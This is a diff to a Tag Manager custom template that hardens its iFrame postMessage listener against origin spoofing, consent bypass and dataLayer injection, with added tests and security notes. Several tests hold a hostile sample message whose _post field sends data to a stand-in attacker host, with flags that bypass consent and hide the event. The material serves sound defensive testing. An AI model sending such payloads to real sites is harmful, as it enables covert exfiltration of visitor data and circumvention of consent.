@@ -50,7 +50,15 @@ ___TEMPLATE_PARAMETERS___
         "isUnique": false
       }
     ],
-    "help": "Recommended: list the exact hostnames you expect iFrame events from. If you leave this empty, events from ANY http/https iFrame origin are accepted — use only for trusted same-site setups. Opaque origins (sandboxed / srcdoc frames reporting origin \"null\", data:/blob:) are ALWAYS rejected, regardless of this list."
+    "help": "Required: list the exact hostnames you expect iFrame events from. An EMPTY list now rejects every iFrame message (fail-closed since v1.5 — it used to accept ANY http/https origin). Opaque origins (sandboxed / srcdoc frames reporting origin \"null\", data:/blob:) are ALWAYS rejected. With \"Regexp?\" the pattern is anchored (^(?:…)$) but stays a regular expression — escape the dots (shop\\.example\\.com), otherwise shopXexample.com matches as well."
+  },
+  {
+    "type": "CHECKBOX",
+    "name": "allow_noconsent",
+    "checkboxText": "Allow _noConsent from iFrames",
+    "simpleValueType": true,
+    "defaultValue": false,
+    "help": "Off by default. While off, a _noConsent flag arriving by postMessage is stripped, so an iFrame cannot bypass the consent gate of the top frame. Switch it on only if your own allow-listed iFrame deliberately sends functional or legally required events that must be tracked without consent. The flags _post, _post_sent and _noDLPush are always stripped and cannot be re-enabled here."
   },
   {
     "type": "LABEL",
@@ -178,6 +186,7 @@ const JSON = require('JSON');
 const parseUrl = require('parseUrl');
 const callInWindow = require('callInWindow');
 const copyFromDataLayer = require('copyFromDataLayer');
+const log = require('logToConsole');
 
 
 /**
@@ -191,9 +200,10 @@ const copyFromDataLayer = require('copyFromDataLayer');
  *   @param {object} d.d - a copy of the sandbox data object
  *   @param {object} d.e - the current event object
  *   @param {object} d.q - event queue
+ *   @param {object} d.warned - keys already logged once, see o.f.warnOnce
  * @param {object} f - function library
  */
-var o = o || { c: {debug:false}, d:{ d:data, init:false, e:null, q:[] }, f:{} };
+var o = o || { c: {debug:false}, d:{ d:data, init:false, e:null, q:[], warned:{} }, f:{} };
 
 // Get tag configuration
 o.c.hostnamelist = typeof data.hostnamelist=='object' ? data.hostnamelist : [];
@@ -202,6 +212,7 @@ o.c.addprefixtoall = typeof data.addprefixtoall=='boolean' ? data.addprefixtoall
 o.c.eventfilter = typeof data.eventfilter=='object' ? data.eventfilter : [];
 o.c.dlparams = typeof data.dlparams=='object' ? data.dlparams : [];
 o.c.addparameter = typeof data.addparameter=='object' ? data.addparameter : [];
+o.c.allownoconsent = typeof data.allow_noconsent=='boolean' ? data.allow_noconsent : false;
 
 // Check if page is in an iFrame
 o.c.isiframe = callInWindow('aGTM.f.isIFrame');
@@ -239,6 +250,66 @@ o.f.url2host = o.f.url2host || function (url) {
 };
 
 /**
+ * Log a message once per page and key.
+ * This listener sees EVERY postMessage on the page, so a per-message log line
+ * would flood the console of a live container. The dedup key is always a fixed
+ * constant, never derived from the message.
+ * @param {string} key - dedup key
+ * @param {string} msg - text to log
+ * Usage: o.f.warnOnce('emptylist', 'the allow-list is empty');
+ */
+o.f.warnOnce = o.f.warnOnce || function (key,msg) {
+  if (typeof o.d.warned[key]!='undefined') return;
+  o.d.warned[key] = true;
+  log('warn', 'aGTM iFrame Support: ' + msg);
+};
+
+/**
+ * Decide whether a key of a foreign message must be dropped (F-178).
+ * A namespace rule, not a name list: a future control flag of the library
+ * cannot silently re-open the hole. Dropped are every key starting with '_'
+ * (aGTM's control flags), the fields fire()/inject() set themselves, and the
+ * prototype-pollution trio. Verified that the fields iFrameFire legitimately
+ * appends - aGTM_source, ifEvCtr, ifEvCtr_<event> - survive this; a blanket
+ * 'aGTM' prefix filter on KEYS would throw them away.
+ * @param {string} key - the key of the foreign message
+ * Usage: if (o.f.isBlockedKey(key)) continue;
+ */
+o.f.isBlockedKey = o.f.isBlockedKey || function (key) {
+  if (key.indexOf('_')===0) {
+    // _noConsent is a documented channel for functional/legal events and real
+    // aGTM iFrames do put it on the wire (iFrameFire only removes aGTMts and
+    // aGTMparams), so it stays reachable behind an explicit opt-in instead of
+    // being removed outright. _post/_post_sent/_noDLPush are never legitimate
+    // here - _noDLPush in particular can never legitimately be on the wire,
+    // because fire() does not even call iFrameFire for such an event.
+    if (key=='_noConsent' && o.c.allownoconsent) return false;
+    return true;
+  }
+  if (key=='aGTMts' || key=='aGTMparams' || key=='aGTMchk' || key=='aGTMdl' || key=='eventModel') return true;
+  if (key=='__proto__' || key=='constructor' || key=='prototype') return true;
+  return false;
+};
+
+/**
+ * Decide whether an event name is reserved for the aGTM library (F-178).
+ * This is the set aGTM.f.iFrameFire routes locally via sendnaus, so it can
+ * never legitimately arrive by postMessage; an 'aGTM' name additionally
+ * bypasses the library's consent gate. The predicate matches the library
+ * (indexOf === 0) instead of aGTM.f.rTest, which is case-insensitive and
+ * therefore wider than the gate it is meant to protect.
+ * @param {string} name - the final event name, AFTER any prefix was applied
+ * Usage: if (o.f.isReservedEvent(ev.event)) return;
+ */
+o.f.isReservedEvent = o.f.isReservedEvent || function (name) {
+  if (name.indexOf('aGTM')===0) return true;
+  if (name.indexOf('gtm.')===0) return true;
+  if (name.indexOf('aDOMready')===0 || name.indexOf('vDOMready')===0) return true;
+  if (name.indexOf('aPAGEready')===0 || name.indexOf('vPAGEready')===0) return true;
+  return false;
+};
+
+/**
  * Message Listener Function
  * @param {object} msg - The Message Object what the iFrame has send
  * @param {string} org - The iFrame Origin URL
@@ -249,21 +320,29 @@ o.f.msgListener = function (msg,org) {
   var ev = JSON.parse(JSON.stringify(msg));
   // Origin check (fail-closed). Resolve the sender hostname first. An opaque or
   // non-http origin ('null' from sandboxed/srcdoc frames, data:/blob:) resolves
-  // to '' and can never be allow-listed — it is always rejected, whether or not
-  // a hostname allow-list is configured. When an allow-list IS configured, the
-  // resolved hostname must additionally match one of its entries.
+  // to '' and can never be allow-listed. An EMPTY allow-list now rejects every
+  // message as well (F-178, breaking change in v1.5): the former "empty accepts
+  // any http/https origin" default handed every embedded ad, video or chat
+  // frame a write channel into the top frame's dataLayer.
   var hostname = org ? o.f.url2host(org) : '';
   if (!hostname) return;
-  if (o.c.hostnamelist.length>0) {
-    var track = false;
-    for (var i=0; i<o.c.hostnamelist.length; i++) {
-      var h = o.c.hostnamelist[i].hostname;
-      if (o.c.hostnamelist[i].isregex) {
-        if (callInWindow('aGTM.f.rTest', hostname, h)) { track = true; break; }
-      } else if (h==hostname) { track = true; break; }
-    }
-    if (!track) return;
+  if (o.c.hostnamelist.length<1) {
+    o.f.warnOnce('emptylist', 'the hostname allow-list is empty, so every iFrame message is rejected. Enter the hostnames you expect events from.');
+    return;
   }
+  var track = false;
+  for (var i=0; i<o.c.hostnamelist.length; i++) {
+    var h = o.c.hostnamelist[i].hostname;
+    if (typeof h!='string' || !h) continue;
+    if (o.c.hostnamelist[i].isregex) {
+      // Anchor the pattern (F-179). aGTM.f.rTest is shared library code with
+      // substring semantics that other callers rely on, so it cannot be
+      // anchored there: an entry 'shop.example.com' would otherwise also match
+      // 'shop.example.com.attacker.net' and 'evilshop.example.com'.
+      if (callInWindow('aGTM.f.rTest', hostname, '^(?:' + h + ')$')) { track = true; break; }
+    } else if (h==hostname) { track = true; break; }
+  }
+  if (!track) return;
   // Only process real aGTM events (carrying a non-empty 'event'). Event-less
   // foreign messages are dropped to prevent dataLayer injection/poisoning.
   if (typeof ev.event!='string' || !ev.event) return;
@@ -306,11 +385,29 @@ o.f.msgListener = function (msg,org) {
   if (o.c.eventprefix) {
     if (o.c.addprefixtoall) ev.event = o.c.eventprefix + ev.event;
   }
+  // Reject event names reserved for the library, checked on the FINAL name
+  // (F-178). Checked here and not at the top of the listener, because the
+  // shipped default applies no prefix at all (so 'aGTM_evil' would reach fire()
+  // verbatim) and because an event prefix starting with 'aGTM' can create such
+  // a name in the first place.
+  if (o.f.isReservedEvent(ev.event)) {
+    o.f.warnOnce('reserved', 'an iFrame message was rejected because its event name is reserved for the aGTM library. Check the Event Prefix if you did not expect this. Name: ' + ev.event);
+    return;
+  }
   // Merge the predefined params (fresh clone per message, so keys from one
-  // message never leak into the next) with the iFrame message event.
+  // message never leak into the next) with the iFrame message event. Control
+  // keys are skipped inside the loop rather than neutralised afterwards - see
+  // o.f.isBlockedKey.
   var out = JSON.parse(JSON.stringify(o.d.e));
   for (var key in ev) {
+    if (o.f.isBlockedKey(key)) continue;
     out[key] = ev[key];
+  }
+  // Re-apply the operator's additional parameters AFTER the foreign message.
+  // Their field help says they overwrite existing event parameters, and until
+  // now a foreign value silently won over a configured traffic_type/user_id.
+  for (var p=0; p<o.c.addparameter.length; p++) {
+    out[o.c.addparameter[p].pkey] = o.c.addparameter[p].pvalue;
   }
   // Fire event
   callInWindow('aGTM.f.fire', out);
@@ -330,6 +427,27 @@ data.gtmOnSuccess();
 ___WEB_PERMISSIONS___
 
 [
+  {
+    "instance": {
+      "key": {
+        "publicId": "logging",
+        "versionId": "1"
+      },
+      "param": [
+        {
+          "key": "environments",
+          "value": {
+            "type": 1,
+            "string": "all"
+          }
+        }
+      ]
+    },
+    "clientAnnotations": {
+      "isEditedByUser": true
+    },
+    "isRequired": true
+  },
   {
     "instance": {
       "key": {
@@ -600,7 +718,7 @@ scenarios:
       if (fn === 'aGTM.f.evLstn') { if (arguments[2] === 'message') listener = arguments[3]; return; }
       if (fn === 'aGTM.f.fire') { fired = true; return; }
     });
-    runCode({ hostnamelist: [], eventprefix: '', addprefixtoall: false, eventfilter: [], dlparams: [], addparameter: [] });
+    runCode({ hostnamelist: [{ hostname: 'trusted.com', isregex: false }], eventprefix: '', addprefixtoall: false, eventfilter: [], dlparams: [], addparameter: [] });
     listener({ event: 'purchase' }, 'null');
     assertThat(fired).isEqualTo(false);
 - name: Message from a non-allowlisted origin is rejected
@@ -627,7 +745,7 @@ scenarios:
       if (fn === 'aGTM.f.evLstn') { if (arguments[2] === 'message') listener = arguments[3]; return; }
       if (fn === 'aGTM.f.fire') { fired = true; return; }
     });
-    runCode({ hostnamelist: [], eventprefix: '', addprefixtoall: false, eventfilter: [], dlparams: [], addparameter: [] });
+    runCode({ hostnamelist: [{ hostname: 'trusted.com', isregex: false }], eventprefix: '', addprefixtoall: false, eventfilter: [], dlparams: [], addparameter: [] });
     listener({ foo: 'bar' }, 'https://trusted.com');
     assertThat(fired).isEqualTo(false);
 - name: Event prefix is applied when addprefixtoall is on
@@ -639,10 +757,191 @@ scenarios:
       if (fn === 'aGTM.f.evLstn') { if (arguments[2] === 'message') listener = arguments[3]; return; }
       if (fn === 'aGTM.f.fire') { fired = arguments[1]; return; }
     });
-    runCode({ hostnamelist: [], eventprefix: 'if_', addprefixtoall: true, eventfilter: [], dlparams: [], addparameter: [] });
+    runCode({ hostnamelist: [{ hostname: 'trusted.com', isregex: false }], eventprefix: 'if_', addprefixtoall: true, eventfilter: [], dlparams: [], addparameter: [] });
     listener({ event: 'click' }, 'https://trusted.com');
     assertThat(fired).isDefined();
     assertThat(fired.event).isEqualTo('if_click');
+- name: Control flags from a foreign message are stripped
+  code: |-
+    // F-178: measured payload of the finding. _post turned the top origin into a
+    // sender to an arbitrary URL, _noConsent bypassed the consent gate and
+    // _noDLPush made the whole thing invisible in the dataLayer.
+    let fired = null, listener = null;
+    mock('callInWindow', function(fn) {
+      if (fn === 'aGTM.f.isIFrame') { return false; }
+      if (fn === 'aGTM.f.ifHandshake') { return; }
+      if (fn === 'aGTM.f.evLstn') { if (arguments[2] === 'message') listener = arguments[3]; return; }
+      if (fn === 'aGTM.f.fire') { fired = arguments[1]; return; }
+    });
+    runCode({ hostnamelist: [{ hostname: 'trusted.com', isregex: false }], eventprefix: '', addprefixtoall: false, eventfilter: [], dlparams: [], addparameter: [] });
+    listener({ event: 'evil', _noConsent: true, _noDLPush: true, _post_sent: false, _post: { url: 'https://attacker.example/collect' }, kundennummer: 'K-4711' }, 'https://trusted.com');
+    assertThat(fired).isDefined();
+    assertThat(fired.event).isEqualTo('evil');
+    assertThat(fired._post).isUndefined();
+    assertThat(fired._post_sent).isUndefined();
+    assertThat(fired._noConsent).isUndefined();
+    assertThat(fired._noDLPush).isUndefined();
+    // ordinary payload keys are untouched
+    assertThat(fired.kundennummer).isEqualTo('K-4711');
+- name: Opt-in keeps _noConsent from an allow-listed iFrame
+  code: |-
+    // Real aGTM iFrames put _noConsent on the wire and it is a documented way to
+    // send functional/legal events, so the operator can switch it back on.
+    let fired = null, listener = null;
+    mock('callInWindow', function(fn) {
+      if (fn === 'aGTM.f.isIFrame') { return false; }
+      if (fn === 'aGTM.f.ifHandshake') { return; }
+      if (fn === 'aGTM.f.evLstn') { if (arguments[2] === 'message') listener = arguments[3]; return; }
+      if (fn === 'aGTM.f.fire') { fired = arguments[1]; return; }
+    });
+    runCode({ hostnamelist: [{ hostname: 'trusted.com', isregex: false }], allow_noconsent: true, eventprefix: '', addprefixtoall: false, eventfilter: [], dlparams: [], addparameter: [] });
+    listener({ event: 'legal_notice', _noConsent: true, _post: { url: 'https://attacker.example/collect' }, _noDLPush: true }, 'https://trusted.com');
+    assertThat(fired).isDefined();
+    assertThat(fired._noConsent).isEqualTo(true);
+    // the opt-in is only about _noConsent - the other flags stay stripped
+    assertThat(fired._post).isUndefined();
+    assertThat(fired._noDLPush).isUndefined();
+- name: Event named aGTM is rejected when no prefix is configured
+  code: |-
+    // The shipped default applies no prefix, so aGTM_evil would reach fire()
+    // verbatim and bypass the library consent gate.
+    let fired = false, listener = null;
+    mock('callInWindow', function(fn) {
+      if (fn === 'aGTM.f.isIFrame') { return false; }
+      if (fn === 'aGTM.f.ifHandshake') { return; }
+      if (fn === 'aGTM.f.evLstn') { if (arguments[2] === 'message') listener = arguments[3]; return; }
+      if (fn === 'aGTM.f.fire') { fired = true; return; }
+    });
+    runCode({ hostnamelist: [{ hostname: 'trusted.com', isregex: false }], eventprefix: '', addprefixtoall: false, eventfilter: [], dlparams: [], addparameter: [] });
+    listener({ event: 'aGTM_evil' }, 'https://trusted.com');
+    assertThat(fired).isEqualTo(false);
+- name: Event named aGTM is rejected even with a prefix configured
+  code: |-
+    // An event prefix starting with aGTM can create the dangerous name in the
+    // first place - which is why the check runs on the FINAL name.
+    let fired = false, listener = null;
+    mock('callInWindow', function(fn) {
+      if (fn === 'aGTM.f.isIFrame') { return false; }
+      if (fn === 'aGTM.f.ifHandshake') { return; }
+      if (fn === 'aGTM.f.evLstn') { if (arguments[2] === 'message') listener = arguments[3]; return; }
+      if (fn === 'aGTM.f.fire') { fired = true; return; }
+    });
+    runCode({ hostnamelist: [{ hostname: 'trusted.com', isregex: false }], eventprefix: 'aGTM_', addprefixtoall: true, eventfilter: [], dlparams: [], addparameter: [] });
+    listener({ event: 'click' }, 'https://trusted.com');
+    assertThat(fired).isEqualTo(false);
+- name: Event named gtm dot is rejected
+  code: |-
+    // Otherwise a foreign frame could fire the operator's built-in GTM triggers.
+    let fired = false, listener = null;
+    mock('callInWindow', function(fn) {
+      if (fn === 'aGTM.f.isIFrame') { return false; }
+      if (fn === 'aGTM.f.ifHandshake') { return; }
+      if (fn === 'aGTM.f.evLstn') { if (arguments[2] === 'message') listener = arguments[3]; return; }
+      if (fn === 'aGTM.f.fire') { fired = true; return; }
+    });
+    runCode({ hostnamelist: [{ hostname: 'trusted.com', isregex: false }], eventprefix: '', addprefixtoall: false, eventfilter: [], dlparams: [], addparameter: [] });
+    listener({ event: 'gtm.click' }, 'https://trusted.com');
+    assertThat(fired).isEqualTo(false);
+- name: aDOMready and vPAGEready from a foreign frame are rejected
+  code: |-
+    // Same set aGTM.f.iFrameFire routes locally via sendnaus, so it never
+    // legitimately arrives by postMessage.
+    let fired = false, listener = null;
+    mock('callInWindow', function(fn) {
+      if (fn === 'aGTM.f.isIFrame') { return false; }
+      if (fn === 'aGTM.f.ifHandshake') { return; }
+      if (fn === 'aGTM.f.evLstn') { if (arguments[2] === 'message') listener = arguments[3]; return; }
+      if (fn === 'aGTM.f.fire') { fired = true; return; }
+    });
+    runCode({ hostnamelist: [{ hostname: 'trusted.com', isregex: false }], eventprefix: '', addprefixtoall: false, eventfilter: [], dlparams: [], addparameter: [] });
+    listener({ event: 'aDOMready' }, 'https://trusted.com');
+    assertThat(fired).isEqualTo(false);
+    listener({ event: 'vPAGEready' }, 'https://trusted.com');
+    assertThat(fired).isEqualTo(false);
+- name: Fields set by fire and inject are not accepted as payload
+  code: |-
+    // QA finding: fire() silently drops the whole event when aGTMts is a number
+    // or eventModel is truthy - the cheapest sabotage, a total measurement
+    // blackout without a trace.
+    let fired = null, listener = null;
+    mock('callInWindow', function(fn) {
+      if (fn === 'aGTM.f.isIFrame') { return false; }
+      if (fn === 'aGTM.f.ifHandshake') { return; }
+      if (fn === 'aGTM.f.evLstn') { if (arguments[2] === 'message') listener = arguments[3]; return; }
+      if (fn === 'aGTM.f.fire') { fired = arguments[1]; return; }
+    });
+    runCode({ hostnamelist: [{ hostname: 'trusted.com', isregex: false }], eventprefix: '', addprefixtoall: false, eventfilter: [], dlparams: [], addparameter: [] });
+    listener({ event: 'purchase', aGTMts: 1, eventModel: { a: 1 }, aGTMparams: 'x', aGTMchk: 1, aGTMdl: 'dataLayer' }, 'https://trusted.com');
+    assertThat(fired).isDefined();
+    assertThat(fired.event).isEqualTo('purchase');
+    assertThat(fired.aGTMts).isUndefined();
+    assertThat(fired.eventModel).isUndefined();
+    assertThat(fired.aGTMparams).isUndefined();
+    assertThat(fired.aGTMchk).isUndefined();
+    assertThat(fired.aGTMdl).isUndefined();
+- name: Fields added by iFrameFire survive the filter
+  code: |-
+    // Counter-guard: these are legitimately appended by the library on the way
+    // out, so nobody may later widen the key filter to everything with aGTM.
+    let fired = null, listener = null;
+    mock('callInWindow', function(fn) {
+      if (fn === 'aGTM.f.isIFrame') { return false; }
+      if (fn === 'aGTM.f.ifHandshake') { return; }
+      if (fn === 'aGTM.f.evLstn') { if (arguments[2] === 'message') listener = arguments[3]; return; }
+      if (fn === 'aGTM.f.fire') { fired = arguments[1]; return; }
+    });
+    runCode({ hostnamelist: [{ hostname: 'trusted.com', isregex: false }], eventprefix: '', addprefixtoall: false, eventfilter: [], dlparams: [], addparameter: [] });
+    listener({ event: 'purchase', aGTM_source: 'iframe', ifEvCtr: 3, ifEvCtr_purchase: 1 }, 'https://trusted.com');
+    assertThat(fired).isDefined();
+    assertThat(fired.aGTM_source).isEqualTo('iframe');
+    assertThat(fired.ifEvCtr).isEqualTo(3);
+    assertThat(fired.ifEvCtr_purchase).isEqualTo(1);
+- name: Empty hostname list rejects everything
+  code: |-
+    // F-178, breaking change in v1.5: an empty list used to accept any
+    // http/https origin, which gave every embedded frame a write channel.
+    let fired = false, listener = null;
+    mock('callInWindow', function(fn) {
+      if (fn === 'aGTM.f.isIFrame') { return false; }
+      if (fn === 'aGTM.f.ifHandshake') { return; }
+      if (fn === 'aGTM.f.evLstn') { if (arguments[2] === 'message') listener = arguments[3]; return; }
+      if (fn === 'aGTM.f.fire') { fired = true; return; }
+    });
+    runCode({ hostnamelist: [], eventprefix: '', addprefixtoall: false, eventfilter: [], dlparams: [], addparameter: [] });
+    listener({ event: 'purchase' }, 'https://trusted.com');
+    assertThat(fired).isEqualTo(false);
+- name: Regex hostname entries are anchored before matching
+  code: |-
+    // F-179: aGTM.f.rTest is unanchored, so the entry shop.example.com also
+    // matched shop.example.com.attacker.net. The template anchors the pattern
+    // before handing it over.
+    let fired = false, listener = null, pattern = null;
+    mock('callInWindow', function(fn) {
+      if (fn === 'aGTM.f.isIFrame') { return false; }
+      if (fn === 'aGTM.f.ifHandshake') { return; }
+      if (fn === 'aGTM.f.evLstn') { if (arguments[2] === 'message') listener = arguments[3]; return; }
+      if (fn === 'aGTM.f.rTest') { pattern = arguments[2]; return false; }
+      if (fn === 'aGTM.f.fire') { fired = true; return; }
+    });
+    runCode({ hostnamelist: [{ hostname: 'shop\\.example\\.com', isregex: true }], eventprefix: '', addprefixtoall: false, eventfilter: [], dlparams: [], addparameter: [] });
+    listener({ event: 'purchase' }, 'https://shop.example.com.attacker.net');
+    assertThat(pattern).isEqualTo('^(?:shop\\.example\\.com)$');
+    assertThat(fired).isEqualTo(false);
+- name: Additional parameters win over the foreign message
+  code: |-
+    // The field help promises the additional parameters overwrite existing event
+    // parameters - before this fix a foreign value silently won.
+    let fired = null, listener = null;
+    mock('callInWindow', function(fn) {
+      if (fn === 'aGTM.f.isIFrame') { return false; }
+      if (fn === 'aGTM.f.ifHandshake') { return; }
+      if (fn === 'aGTM.f.evLstn') { if (arguments[2] === 'message') listener = arguments[3]; return; }
+      if (fn === 'aGTM.f.fire') { fired = arguments[1]; return; }
+    });
+    runCode({ hostnamelist: [{ hostname: 'trusted.com', isregex: false }], eventprefix: '', addprefixtoall: false, eventfilter: [], dlparams: [], addparameter: [{ pkey: 'traffic_type', pvalue: 'internal' }] });
+    listener({ event: 'purchase', traffic_type: 'spoofed' }, 'https://trusted.com');
+    assertThat(fired).isDefined();
+    assertThat(fired.traffic_type).isEqualTo('internal');
 setup: ''
 
 
@@ -650,20 +949,39 @@ ___NOTES___
 
 # aGTM Custom Template
 
-- Version 1.1
+- Version 1.2
 - Autor: Andi Petzoldt <andi@petzoldt.net>
-- Last Update: 13.07.2026
+- Last Update: 12.08.2026
 
 ## Security
 
 Foreign-origin postMessages are handled fail-closed:
 - Opaque / non-http origins (sandboxed or srcdoc frames reporting origin "null",
   data:/blob:) are always rejected — they can never be allow-listed.
-- When a hostname allow-list is configured, the sender hostname must match it.
+- The hostname allow-list must be configured. An **empty list rejects every
+  message** (changed in v1.5 — it used to accept any http/https origin).
+- A regex allow-list entry is anchored (`^(?:…)$`) before it is matched, so an
+  entry cannot be extended by a longer attacker-controlled hostname. Dots still
+  have to be escaped in the pattern itself.
+- aGTM's control flags are never taken from a foreign message: every key starting
+  with `_` is skipped (`_noConsent` only if the operator opted in), as are
+  `aGTMts`, `aGTMparams`, `aGTMchk`, `aGTMdl`, `eventModel` and
+  `__proto__`/`constructor`/`prototype`.
+- Event names reserved for the library (`aGTM*`, `gtm.*`, `[av]DOMready`,
+  `[av]PAGEready`) are rejected, checked on the final name after prefixing.
 - Only messages carrying a non-empty `event` are fired; event-less foreign
-  messages are dropped (no dataLayer injection).
+  messages are dropped.
 - On the library side the iFrame accepts the top→iFrame handshake only from
   `window.top`, so the return origin cannot be hijacked by a sibling frame.
+
+What this does **not** protect against: an allow-listed frame can still fire any
+non-reserved event with any payload — the allow-list is the trust boundary, the
+event content is not checked. The sender itself is not verified beyond its origin
+(`e.source` never reaches the template, `aGTM.f.evLstn` passes only `e.data` and
+`e.origin`), so anything running inside an allow-listed origin can send events in
+its name. An event name listed in `aGTM.c.consent_events` also still triggers a
+consent re-read — that is control through the name, which a key filter cannot
+catch.
 
 ## Description
 
